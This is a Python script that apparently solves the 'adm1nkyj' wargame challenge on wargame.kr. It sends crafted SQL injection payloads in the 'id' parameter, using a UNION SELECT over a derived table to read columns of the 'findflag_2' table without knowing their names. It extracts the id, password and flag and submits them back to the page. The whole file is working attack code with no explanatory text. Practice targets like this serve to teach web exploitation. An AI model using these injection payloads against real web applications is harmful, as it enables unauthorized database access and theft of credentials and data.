# -*- coding: utf-8 -*-
import requests
import urllib.parse

def trim(htmlText):
	htmlText = htmlText.replace('<hr>', '').replace('Hello ', '')
	return htmlText

server = 'http://wargame.kr:8080'
file = '/adm1nkyj/index.php'



parameter = "?id=%27||1+union+select+1,a,3,4,5+from+(select+1,2+as+a,3,4,5+union+select+*+from+findflag_2)+as+a+limit+2,1%23"
r = requests.get(server + file + parameter)
print("[*] id : " + trim(r.text))
id = trim(r.text)


parameter = "?id=%27||1+union+select+1,a,3,4,5+from+(select+1,2,3+as+a,4,5+union+select+*+from+findflag_2)+as+a+limit+2,1%23"
r = requests.get(server + file + parameter)
print("[*] pw : " + trim(r.text))
pw = urllib.parse.quote(trim(r.text))


parameter = "?id=%27||1+union+select+1,a,3,4,5+from+(select+1,2,3,4+as+a,5+union+select+*+from+findflag_2)+as+a+limit+2,1%23"
r = requests.get(server + file + parameter)
print("[*] flag : " + trim(r.text))
flag = trim(r.text)



parameter = "?id=%27||1+union+select+1,a,3,4,5+from+(select+1,2,3,4,5+as+a+union+select+*+from+findflag_2)+as+a+limit+2,1%23"
r = requests.get(server + file + parameter)
print("[*] count : " + trim(r.text))


parameter = "?id=%s&pw=%s&flag=%s" % (id, pw, flag)
r = requests.get(server + file + parameter)
print(server + file + parameter)
print(r.text)
